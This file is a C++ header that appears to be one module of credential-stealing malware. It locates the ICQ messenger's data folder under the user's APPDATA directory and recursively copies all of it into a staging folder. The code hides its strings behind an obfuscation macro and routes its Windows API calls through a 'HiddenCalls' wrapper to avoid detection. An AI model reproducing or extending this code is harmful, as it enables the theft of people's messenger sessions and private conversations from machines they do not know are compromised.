#ifndef ICQ_HPP
#define ICQ_HPP

#include <string>
#include <filesystem>
#include <cstdlib>
#include "Winapi_structs.hpp"
#include "obfusheader.h"
namespace fs = std::filesystem;

namespace ICQ {
    inline void Extract(const std::string& baseDir) {
        char* roamingPath = nullptr;
        size_t requiredSize = 0;
        _dupenv_s(&roamingPath, &requiredSize, OBF("APPDATA"));

        if (!roamingPath) return;

        std::string icqDir = std::string(roamingPath) + OBF("\\ICQ");
        free(roamingPath);

        if (!fs::exists(icqDir)) return;

        std::string targetDir = baseDir + OBF("\\ICQ");
        HiddenCalls::CreateDirectoryA(targetDir.c_str(), NULL);

        for (const auto& entry : fs::recursive_directory_iterator(icqDir)) {
            std::string destPath = targetDir + "\\" + entry.path().filename().string();
            if (fs::is_directory(entry)) {
                HiddenCalls::CreateDirectoryA(destPath.c_str(), NULL);
            }
            else {
                HiddenCalls::CopyFileA(entry.path().string().c_str(), destPath.c_str(), FALSE);
            }
        }
    }
}

#endif
